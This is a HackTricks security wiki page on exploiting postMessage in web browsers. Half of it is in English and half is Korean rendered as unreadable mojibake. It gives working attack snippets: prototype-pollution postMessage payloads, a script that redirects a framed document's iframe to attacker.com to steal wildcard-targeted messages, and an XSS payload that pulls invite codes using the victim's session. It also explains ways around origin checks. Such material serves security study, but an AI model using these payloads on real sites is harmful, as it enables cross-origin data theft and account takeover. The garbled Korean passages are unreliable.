# PostMessage ì·¨ì•½ì 

## PostMessage ì·¨ì•½ì 

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)ëŠ” **ë‹¤í¬ì›¹** ê¸°ë°˜ì˜ ê²€ìƒ‰ ì—”ì§„ìœ¼ë¡œ, ê¸°ì—…ì´ë‚˜ ê³ ê°ì´ **stealer malwares**ì— ì˜í•´ **ì¹¨í•´**ë˜ì—ˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆëŠ” **ë¬´ë£Œ** ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.

WhiteIntelì˜ ì£¼ìš” ëª©í‘œëŠ” ì •ë³´ íƒˆì·¨ ì•…ì„±ì½”ë“œë¡œ ì¸í•œ ê³„ì • íƒˆì·¨ ë° ëœì„¬ì›¨ì–´ ê³µê²©ì— ë§ì„œ ì‹¸ìš°ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê·¸ë“¤ì˜ ì›¹ì‚¬ì´íŠ¸ë¥¼ í™•ì¸í•˜ê³  **ë¬´ë£Œ**ë¡œ ì—”ì§„ì„ ì‚¬ìš©í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% embed url="https://whiteintel.io" %}

***

## **PostMessage** ì „ì†¡

**PostMessage**ëŠ” ë©”ì‹œì§€ë¥¼ ì „ì†¡í•˜ê¸° ìœ„í•´ ë‹¤ìŒ ê¸°ëŠ¥ì„ ì‚¬ìš©í•©ë‹ˆë‹¤:
```bash
targetWindow.postMessage(message, targetOrigin, [transfer]);

# postMessage to current page
window.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe with id "idframe"
<iframe id="idframe" src="http://victim.com/"></iframe>
document.getElementById('idframe').contentWindow.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an iframe via onload
<iframe src="https://victim.com/" onload="this.contentWindow.postMessage('<script>print()</script>','*')">

# postMessage to popup
win = open('URL', 'hack', 'width=800,height=300,top=500');
win.postMessage('{"__proto__":{"isAdmin":True}}', '*')

# postMessage to an URL
window.postMessage('{"__proto__":{"isAdmin":True}}', 'https://company.com')

# postMessage to iframe inside popup
win = open('URL-with-iframe-inside', 'hack', 'width=800,height=300,top=500');
## loop until win.length == 1 (until the iframe is loaded)
win[0].postMessage('{"__proto__":{"isAdmin":True}}', '*')
```
Note that **targetOrigin** can be a '\*' or an URL like _https://company.com._\
In the **second scenario**, the **message can only be sent to that domain** (even if the origin of the window object is different).\
If the **wildcard** is used, **messages could be sent to any domain**, and will be sent to the origin of the Window object.

### Attacking iframe & wildcard in **targetOrigin**

As explained in [**this report**](https://blog.geekycat.in/google-vrp-hijacking-your-screenshots/) if you find a page that can be **iframed** (no `X-Frame-Header` protection) and that is **sending sensitive** message via **postMessage** using a **wildcard** (\*), you can **modify** the **origin** of the **iframe** and **leak** the **sensitive** message to a domain controlled by you.\
Note that if the page can be iframed but the **targetOrigin** is **set to a URL and not to a wildcard**, this **trick won't work**.
```markup
<html>
<iframe src="https://docs.google.com/document/ID" />
<script>
setTimeout(exp, 6000); //Wait 6s

//Try to change the origin of the iframe each 100ms
function exp(){
setInterval(function(){
window.frames[0].frame[0][2].location="https://attacker.com/exploit.html";
}, 100);
}
</script>
```
## addEventListener ì•…ìš©

**`addEventListener`**ëŠ” JSê°€ **`postMessages`**ë¥¼ ê¸°ëŒ€í•˜ëŠ” í•¨ìˆ˜ë¥¼ ì„ ì–¸í•˜ëŠ” ë° ì‚¬ìš©í•˜ëŠ” í•¨ìˆ˜ì…ë‹ˆë‹¤.\
ë‹¤ìŒê³¼ ìœ ì‚¬í•œ ì½”ë“œê°€ ì‚¬ìš©ë  ê²ƒì…ë‹ˆë‹¤:
```javascript
window.addEventListener("message", (event) => {
if (event.origin !== "http://example.org:8080")
return;

// ...
}, false);
```
Note in this case how the **first thing** that the code is doing is **checking the origin**. This is terribly **important** mainly if the page is going to do **anything sensitive** with the received information (like changing a password). **If it doesn't check the origin, attackers can make victims send arbitrary data to this endpoints** and change the victims passwords (in this example).

### Enumeration

In order to **find event listeners** in the current page you can:

* **Search** the JS code for `window.addEventListener` and `$(window).on` (_JQuery version_)
* **Execute** in the developer tools console: `getEventListeners(window)`

![](<../../.gitbook/assets/image (618) (1).png>)

* **Go to** _Elements --> Event Listeners_ in the developer tools of the browser

![](<../../.gitbook/assets/image (396).png>)

* Use a **browser extension** like [**https://github.com/benso-io/posta**](https://github.com/benso-io/posta) or [https://github.com/fransr/postMessage-tracker](https://github.com/fransr/postMessage-tracker). This browser extensions will **intercept all the messages** and show them to you.

### Origin check bypasses

* **`event.isTrusted`** ì†ì„±ì€ ì§„ì •í•œ ì‚¬ìš©ì í–‰ë™ì— ì˜í•´ ìƒì„±ëœ ì´ë²¤íŠ¸ì— ëŒ€í•´ì„œë§Œ `True`ë¥¼ ë°˜í™˜í•˜ë¯€ë¡œ ì•ˆì „í•œ ê²ƒìœ¼ë¡œ ê°„ì£¼ë©ë‹ˆë‹¤. ì˜¬ë°”ë¥´ê²Œ êµ¬í˜„ë˜ë©´ ìš°íšŒí•˜ê¸° ì–´ë ¤ìš°ë‚˜, ë³´ì•ˆ ê²€ì‚¬ì—ì„œì˜ ì¤‘ìš”ì„±ì€ ì£¼ëª©í•  ë§Œí•©ë‹ˆë‹¤.
*   PostMessage ì´ë²¤íŠ¸ì—ì„œ ì¶œì²˜ ìœ íš¨ì„±ì„ ê²€ì‚¬í•˜ê¸° ìœ„í•´ **`indexOf()`**ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²ƒì€ ìš°íšŒì— ì·¨ì•½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì·¨ì•½ì„±ì„ ì„¤ëª…í•˜ëŠ” ì˜ˆëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤:

```javascript
("https://app-sj17.marketo.com").indexOf("https://app-sj17.ma")
```
*   `String.prototype.search()`ì˜ **`search()`** ë©”ì„œë“œëŠ” ë¬¸ìì—´ì´ ì•„ë‹Œ ì •ê·œ í‘œí˜„ì‹ì„ ìœ„í•´ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤. ì •ê·œ í‘œí˜„ì‹ì´ ì•„ë‹Œ ê²ƒì„ ì „ë‹¬í•˜ë©´ ì•”ë¬µì ìœ¼ë¡œ ì •ê·œ í‘œí˜„ì‹ìœ¼ë¡œ ë³€í™˜ë˜ì–´ ë©”ì„œë“œê°€ ì ì¬ì ìœ¼ë¡œ ì•ˆì „í•˜ì§€ ì•Šê²Œ ë©ë‹ˆë‹¤. ì´ëŠ” ì •ê·œ í‘œí˜„ì‹ì—ì„œ ì (.)ì´ ì™€ì¼ë“œì¹´ë“œë¡œ ì‘ìš©í•˜ì—¬ íŠ¹ë³„íˆ ì œì‘ëœ ë„ë©”ì¸ìœ¼ë¡œ ìœ íš¨ì„± ê²€ì‚¬ë¥¼ ìš°íšŒí•  ìˆ˜ ìˆê²Œ í•©ë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´:

```javascript
"https://www.safedomain.com".search("www.s.fedomain.com")
```
* **`match()`** í•¨ìˆ˜ëŠ” `search()`ì™€ ìœ ì‚¬í•˜ê²Œ ì •ê·œ í‘œí˜„ì‹ì„ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì •ê·œ í‘œí˜„ì‹ì´ ì˜ëª» êµ¬ì„±ë˜ë©´ ìš°íšŒì— ì·¨ì•½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
*   **`escapeHtml`** í•¨ìˆ˜ëŠ” ë¬¸ìë¥¼ ì´ìŠ¤ì¼€ì´í”„í•˜ì—¬ ì…ë ¥ì„ ì •ë¦¬í•˜ê¸° ìœ„í•´ ì„¤ê³„ë˜ì—ˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ìƒˆë¡œìš´ ì´ìŠ¤ì¼€ì´í”„ëœ ê°ì²´ë¥¼ ìƒì„±í•˜ì§€ ì•Šê³  ê¸°ì¡´ ê°ì²´ì˜ ì†ì„±ì„ ë®ì–´ì”ë‹ˆë‹¤. ì´ ë™ì‘ì€ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. íŠ¹íˆ, ê°ì²´ë¥¼ ì¡°ì‘í•˜ì—¬ ê·¸ ì œì–´ ì†ì„±ì´ `hasOwnProperty`ë¥¼ ì¸ì‹í•˜ì§€ ëª»í•˜ê²Œ í•  ìˆ˜ ìˆë‹¤ë©´, `escapeHtml`ì€ ì˜ˆìƒëŒ€ë¡œ ì‘ë™í•˜ì§€ ì•Šì„ ê²ƒì…ë‹ˆë‹¤. ì´ëŠ” ì•„ë˜ì˜ ì˜ˆì—ì„œ ë³´ì—¬ì§‘ë‹ˆë‹¤:

*   ì˜ˆìƒë˜ëŠ” ì‹¤íŒ¨:

```javascript
result = u({
message: "'\"<b>\\"
});
result.message // "&#39;&quot;&lt;b&gt;\"
```
*   ì´ìŠ¤ì¼€ì´í”„ ìš°íšŒ:

```javascript
result = u(new Error("'\"<b>\\"));
result.message; // "'"<b>\"
```

ì´ ì·¨ì•½ì„±ì˜ ë§¥ë½ì—ì„œ, `File` ê°ì²´ëŠ” ì½ê¸° ì „ìš© `name` ì†ì„±ìœ¼ë¡œ ì¸í•´ íŠ¹íˆ ì•…ìš©ë  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ì†ì„±ì€ í…œí”Œë¦¿ì—ì„œ ì‚¬ìš©ë  ë•Œ `escapeHtml` í•¨ìˆ˜ì— ì˜í•´ ì •ë¦¬ë˜ì§€ ì•Šì•„ ì ì¬ì ì¸ ë³´ì•ˆ ìœ„í—˜ì„ ì´ˆë˜í•©ë‹ˆë‹¤.
* JavaScriptì˜ `document.domain` ì†ì„±ì€ ìŠ¤í¬ë¦½íŠ¸ì— ì˜í•´ ë„ë©”ì¸ì„ ë‹¨ì¶•í•˜ë„ë¡ ì„¤ì •ë  ìˆ˜ ìˆìœ¼ë©°, ì´ëŠ” ë™ì¼í•œ ë¶€ëª¨ ë„ë©”ì¸ ë‚´ì—ì„œ ë³´ë‹¤ ëŠìŠ¨í•œ ë™ì¼ ì¶œì²˜ ì •ì±… ì‹œí–‰ì„ í—ˆìš©í•©ë‹ˆë‹¤.

### e.origin == window.origin bypass

%%%%%%ë¥¼ ì‚¬ìš©í•˜ì—¬ **sandboxed iframe** ë‚´ì— ì›¹ í˜ì´ì§€ë¥¼ ì‚½ì…í•  ë•Œ, iframeì˜ ì¶œì²˜ê°€ nullë¡œ ì„¤ì •ëœë‹¤ëŠ” ê²ƒì„ ì´í•´í•˜ëŠ” ê²ƒì´ ì¤‘ìš”í•©ë‹ˆë‹¤. ì´ëŠ” **sandbox ì†ì„±** ë° ë³´ì•ˆê³¼ ê¸°ëŠ¥ì— ëŒ€í•œ ê·¸ ì˜ë¯¸ë¥¼ ë‹¤ë£° ë•Œ íŠ¹íˆ ì¤‘ìš”í•©ë‹ˆë‹¤.

sandbox ì†ì„±ì— **`allow-popups`**ë¥¼ ì§€ì •í•˜ë©´ iframe ë‚´ì—ì„œ ì—´ë¦¬ëŠ” ëª¨ë“  íŒì—… ì°½ì€ ë¶€ëª¨ì˜ sandbox ì œí•œì„ ìƒì†ë°›ìŠµë‹ˆë‹¤. ì´ëŠ” **`allow-popups-to-escape-sandbox`** ì†ì„±ì´ í¬í•¨ë˜ì§€ ì•ŠëŠ” í•œ, íŒì—… ì°½ì˜ ì¶œì²˜ë„ `null`ë¡œ ì„¤ì •ë˜ì–´ iframeì˜ ì¶œì²˜ì™€ ì¼ì¹˜í•¨ì„ ì˜ë¯¸í•©ë‹ˆë‹¤.

ë”°ë¼ì„œ ì´ëŸ¬í•œ ì¡°ê±´ì—ì„œ íŒì—…ì´ ì—´ë¦¬ê³  iframeì—ì„œ íŒì—…ìœ¼ë¡œ **`postMessage`**ë¥¼ ì‚¬ìš©í•˜ì—¬ ë©”ì‹œì§€ê°€ ì „ì†¡ë˜ë©´, ì†¡ì‹  ë° ìˆ˜ì‹  ì–‘ìª½ì˜ ì¶œì²˜ê°€ `null`ë¡œ ì„¤ì •ë©ë‹ˆë‹¤. ì´ ìƒí™©ì€ **`e.origin == window.origin`**ì´ trueë¡œ í‰ê°€ë˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ë¥¼ ì´ˆë˜í•©ë‹ˆë‹¤ (`null == null`), ì™œëƒí•˜ë©´ iframeê³¼ íŒì—…ì´ ë™ì¼í•œ `null` ì¶œì²˜ ê°’ì„ ê³µìœ í•˜ê¸° ë•Œë¬¸ì…ë‹ˆë‹¤.

ìì„¸í•œ ë‚´ìš©ì€ **ì½ì–´ë³´ì„¸ìš”**:

{% content-ref url="bypassing-sop-with-iframes-1.md" %}
[bypassing-sop-with-iframes-1.md](bypassing-sop-with-iframes-1.md)
{% endcontent-ref %}

### Bypassing e.source

ë©”ì‹œì§€ê°€ ìŠ¤í¬ë¦½íŠ¸ê°€ ì²­ì·¨í•˜ê³  ìˆëŠ” ë™ì¼í•œ ì°½ì—ì„œ ì˜¨ ê²ƒì¸ì§€ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (íŠ¹íˆ **ë¸Œë¼ìš°ì € í™•ì¥ í”„ë¡œê·¸ë¨ì˜ ì½˜í…ì¸  ìŠ¤í¬ë¦½íŠ¸**ê°€ ë©”ì‹œì§€ê°€ ë™ì¼í•œ í˜ì´ì§€ì—ì„œ ì „ì†¡ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ëŠ” ë° í¥ë¯¸ë¡­ìŠµë‹ˆë‹¤):
```javascript
// If itâ€™s not, return immediately.
if( received_message.source !== window ) {
return;
}
```
ë©”ì‹œì§€ì˜ **`e.source`**ë¥¼ nullë¡œ ê°•ì œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. **iframe**ì„ ìƒì„±í•˜ì—¬ **postMessage**ë¥¼ **ì „ì†¡**í•˜ê³  **ì¦‰ì‹œ ì‚­ì œ**í•˜ë©´ ë©ë‹ˆë‹¤.

ìì„¸í•œ ë‚´ìš©ì€ **ì½ì–´ë³´ì„¸ìš”:**

{% content-ref url="bypassing-sop-with-iframes-2.md" %}
[bypassing-sop-with-iframes-2.md](bypassing-sop-with-iframes-2.md)
{% endcontent-ref %}

### X-Frame-Header ìš°íšŒ

ì´ ê³µê²©ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ ì´ìƒì ìœ¼ë¡œëŠ” **í¬ìƒì ì›¹ í˜ì´ì§€**ë¥¼ `iframe` ì•ˆì— ë„£ì„ ìˆ˜ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ `X-Frame-Header`ì™€ ê°™ì€ ì¼ë¶€ í—¤ë”ëŠ” ê·¸ **ë™ì‘**ì„ **ë°©ì§€**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ì´ëŸ¬í•œ ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” ëœ ì€ë°€í•œ ê³µê²©ì„ ì—¬ì „íˆ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½í•œ ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ìƒˆ íƒ­ì—ì„œ ì—´ê³  ê·¸ì™€ í†µì‹ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```markup
<script>
var w=window.open("<url>")
setTimeout(function(){w.postMessage('text here','*');}, 2000);
</script>
```
### ìì‹ì—ê²Œ ì „ì†¡ëœ ë©”ì‹œì§€ë¥¼ ë©”ì¸ í˜ì´ì§€ ì°¨ë‹¨ìœ¼ë¡œ í›”ì¹˜ê¸°

ë‹¤ìŒ í˜ì´ì§€ì—ì„œëŠ” **ë°ì´í„°ë¥¼ ì „ì†¡í•˜ê¸° ì „ì— ë©”ì¸** í˜ì´ì§€ë¥¼ **ì°¨ë‹¨**í•˜ì—¬ **ìì‹ iframe**ì— ì „ì†¡ëœ **ë¯¼ê°í•œ postmessage ë°ì´í„°**ë¥¼ ì–´ë–»ê²Œ í›”ì¹  ìˆ˜ ìˆëŠ”ì§€ ë³´ì—¬ì¤ë‹ˆë‹¤. ê·¸ë¦¬ê³  **ìì‹ì—ì„œ XSSë¥¼ ì•…ìš©í•˜ì—¬** ë°ì´í„°ê°€ ìˆ˜ì‹ ë˜ê¸° ì „ì— **ìœ ì¶œ**í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤:

{% content-ref url="blocking-main-page-to-steal-postmessage.md" %}
[blocking-main-page-to-steal-postmessage.md](blocking-main-page-to-steal-postmessage.md)
{% endcontent-ref %}

### iframe ìœ„ì¹˜ ìˆ˜ì •ìœ¼ë¡œ ë©”ì‹œì§€ í›”ì¹˜ê¸°

X-Frame-Headerê°€ ì—†ëŠ” ì›¹í˜ì´ì§€ë¥¼ iframeìœ¼ë¡œ ì‚½ì…í•  ìˆ˜ ìˆë‹¤ë©´, **ê·¸ ìì‹ iframeì˜ ìœ„ì¹˜ë¥¼ ë³€ê²½**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ **ì™€ì¼ë“œì¹´ë“œ**ë¥¼ ì‚¬ìš©í•˜ì—¬ ì „ì†¡ëœ **postmessage**ë¥¼ ìˆ˜ì‹ í•˜ê³  ìˆë‹¤ë©´, ê³µê²©ìëŠ” ê·¸ iframeì˜ **ì¶œì²˜**ë¥¼ ìì‹ ì´ **ì œì–´í•˜ëŠ”** í˜ì´ì§€ë¡œ **ë³€ê²½**í•˜ê³  ë©”ì‹œì§€ë¥¼ **í›”ì¹ ** ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="steal-postmessage-modifying-iframe-location.md" %}
[steal-postmessage-modifying-iframe-location.md](steal-postmessage-modifying-iframe-location.md)
{% endcontent-ref %}

### postMessageë¥¼ í†µí•œ í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ ë°/ë˜ëŠ” XSS

`postMessage`ë¥¼ í†µí•´ ì „ì†¡ëœ ë°ì´í„°ê°€ JSì— ì˜í•´ ì‹¤í–‰ë˜ëŠ” ì‹œë‚˜ë¦¬ì˜¤ì—ì„œëŠ” **í˜ì´ì§€ë¥¼ iframeìœ¼ë¡œ ì‚½ì…**í•˜ê³  **í”„ë¡œí† íƒ€ì… ì˜¤ì—¼/XSS**ë¥¼ **ì•…ìš©**í•˜ì—¬ `postMessage`ë¥¼ í†µí•´ ìµìŠ¤í”Œë¡œì‡ì„ ì „ì†¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

[https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)ì—ì„œ **postMessageë¥¼ í†µí•œ XSSì— ëŒ€í•œ ë§¤ìš° ì˜ ì„¤ëª…ëœ ì˜ˆì‹œ**ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

`iframe`ì— ëŒ€í•œ `postMessage`ë¥¼ í†µí•´ **í”„ë¡œí† íƒ€ì… ì˜¤ì—¼ì„ ì•…ìš©í•œ í›„ XSS**ì˜ ì˜ˆì‹œ:
```html
<html>
<body>
<iframe id="idframe" src="http://127.0.0.1:21501/snippets/demo-3/embed"></iframe>
<script>
function get_code() {
document.getElementById('iframe_victim').contentWindow.postMessage('{"__proto__":{"editedbymod":{"username":"<img src=x onerror=\\\"fetch(\'http://127.0.0.1:21501/api/invitecodes\', {credentials: \'same-origin\'}).then(response => response.json()).then(data => {alert(data[\'result\'][0][\'code\']);})\\\" />"}}}','*');
document.getElementById('iframe_victim').contentWindow.postMessage(JSON.stringify("refresh"), '*');
}

setTimeout(get_code, 2000);
</script>
</body>
</html>
```
For **more information**:

* Link to page about [**prototype pollution**](../deserialization/nodejs-proto-prototype-pollution/)
* Link to page about [**XSS**](../xss-cross-site-scripting/)
* Link to page about [**client side prototype pollution to XSS**](../deserialization/nodejs-proto-prototype-pollution/#client-side-prototype-pollution-to-xss)

## References

* [https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html](https://jlajara.gitlab.io/web/2020/07/17/Dom\_XSS\_PostMessage\_2.html)
* [https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd](https://dev.to/karanbamal/how-to-spot-and-exploit-postmessage-vulnerablities-36cd)
* To practice: [https://github.com/yavolo/eventlistener-xss-recon](https://github.com/yavolo/eventlistener-xss-recon)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io)ëŠ” **ë‹¤í¬ ì›¹** ê¸°ë°˜ì˜ ê²€ìƒ‰ ì—”ì§„ìœ¼ë¡œ, íšŒì‚¬ë‚˜ ê³ ê°ì´ **stealer malwares**ì— ì˜í•´ **ì¹¨í•´**ë˜ì—ˆëŠ”ì§€ í™•ì¸í•  ìˆ˜ ìˆëŠ” **ë¬´ë£Œ** ê¸°ëŠ¥ì„ ì œê³µí•©ë‹ˆë‹¤.

WhiteIntelì˜ ì£¼ìš” ëª©í‘œëŠ” ì •ë³´ íƒˆì·¨ ì•…ì„± ì†Œí”„íŠ¸ì›¨ì–´ë¡œ ì¸í•œ ê³„ì • íƒˆì·¨ ë° ëœì„¬ì›¨ì–´ ê³µê²©ì— ë§ì„œ ì‹¸ìš°ëŠ” ê²ƒì…ë‹ˆë‹¤.

ê·¸ë“¤ì˜ ì›¹ì‚¬ì´íŠ¸ë¥¼ í™•ì¸í•˜ê³  **ë¬´ë£Œ**ë¡œ ì—”ì§„ì„ ì‚¬ìš©í•´ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% embed url="https://whiteintel.io" %}

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
